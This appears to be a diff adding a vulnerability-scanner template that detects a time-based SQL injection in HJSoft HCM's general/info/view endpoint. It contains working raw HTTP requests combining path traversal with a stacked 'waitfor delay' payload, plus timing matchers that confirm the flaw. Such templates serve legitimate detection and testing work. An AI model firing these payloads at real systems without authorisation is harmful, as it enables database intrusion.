@@ -1,0 +1,43 @@
+id: hjsoft-hcm-general-info-view-sqli
+info:
+  name: HJSoft HCM General Info View SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1, 4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:{{t1}}'+-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
+
+  - raw:
+      - |
+        GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:{{t3}}'+-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration >= to_number(t3) && duration <= to_number(t4)"
